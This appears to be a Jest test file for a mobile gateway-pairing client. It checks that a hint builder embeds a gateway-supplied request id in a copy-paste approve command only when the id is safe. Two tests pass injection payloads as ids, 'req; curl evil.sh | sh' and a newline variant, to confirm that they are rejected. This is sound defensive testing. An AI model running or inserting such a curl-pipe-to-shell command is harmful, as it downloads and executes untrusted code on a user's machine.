// pendingApprovalHint is a pure string builder, but access.ts imports the
// device-identity crypto chain (@noble/hashes is ESM-only under jest) — mock
// the boundary the same way openclaw-client-handshake-test.ts does.
jest.mock('@/lib/gateway/device-identity', () => ({
  loadOrCreateDeviceIdentity: async () => ({
    deviceId: 'test-device',
    publicKeyB64Url: 'test-key',
  }),
  signDevicePayload: async () => 'test-signature',
}));

// access.ts also imports the OpenClaw client for the WS pairing dialect; its
// storage chain pulls RN async-storage which has no jest shim here.
jest.mock('@/lib/gateway/openclaw-client', () => ({
  OpenClawGatewayClient: class {
    connect() {}
    disconnect() {}
  },
}));

import { pendingApprovalHint } from '@/lib/portal/access';

test('a request with a requestId names the exact approve command', () => {
  // Pairing Order B: the operator holds the phone while the approval runs on
  // the Gate machine. "Approve it on the gateway" sends them to the runbook
  // mid-flow; the Gate already returned the requestId, so the hint must name
  // the command with it — no cross-referencing `pair list` by hand.
  const hint = pendingApprovalHint('3f9c1a20-4b7e-4d6f-9a1b-2c8d5e7f0a11');
  expect(hint).toContain('node gate/cli.mjs pair approve 3f9c1a20-4b7e-4d6f-9a1b-2c8d5e7f0a11');
  expect(hint).toContain('then tap Save & connect again.');
});

test('a request without a requestId teaches pair list first, then approve', () => {
  // Older or non-conforming gates may answer 202 without a body id. The hint
  // still has to be copy-paste actionable, so it walks both commands.
  const hint = pendingApprovalHint(undefined);
  expect(hint).toContain('node gate/cli.mjs pair list');
  expect(hint).toContain('node gate/cli.mjs pair approve <requestId>');
  expect(hint).not.toContain('undefined');
});

test('a whitespace-only requestId is treated as missing', () => {
  const hint = pendingApprovalHint('   ');
  expect(hint).toContain('node gate/cli.mjs pair list');
  expect(hint).not.toContain('pair approve    ');
});

test('surrounding whitespace in a real id is trimmed before embedding', () => {
  // A padded id would break a straight copy-paste of the approve command.
  const hint = pendingApprovalHint(' req-42 ');
  expect(hint).toContain('node gate/cli.mjs pair approve req-42\n');
});

test('a requestId carrying shell metacharacters is never embedded', () => {
  // The id comes off the wire from an unverified gateway and lands in a
  // command a human pastes into their Gate machine. A hostile gateway must
  // not be able to author that command — anything outside plain id
  // characters falls back to the always-safe pair-list walk.
  const hint = pendingApprovalHint('req; curl evil.sh | sh');
  expect(hint).toContain('node gate/cli.mjs pair list');
  expect(hint).toContain('pair approve <requestId>');
  expect(hint).not.toContain('curl');
});

test('a newline cannot smuggle a second line into the copy-paste block', () => {
  // Multi-line payloads are the realistic attack: the hint renders as a code
  // block, so a \n inside the id would render an extra plausible-looking
  // command line right under the approve command.
  const hint = pendingApprovalHint('req-42\ncurl evil.sh | sh');
  expect(hint).toContain('node gate/cli.mjs pair list');
  expect(hint).not.toContain('curl');
  expect(hint.split('\n')).toHaveLength(9); // exact pair-list shape, nothing appended
});

test('slug ids with dots and underscores still name the exact command', () => {
  // The allowlist must not reject legitimate non-UUID slugs real gates emit.
  const hint = pendingApprovalHint('req_42.v2');
  expect(hint).toContain('node gate/cli.mjs pair approve req_42.v2\n');
  expect(hint).not.toContain('<requestId>');
});
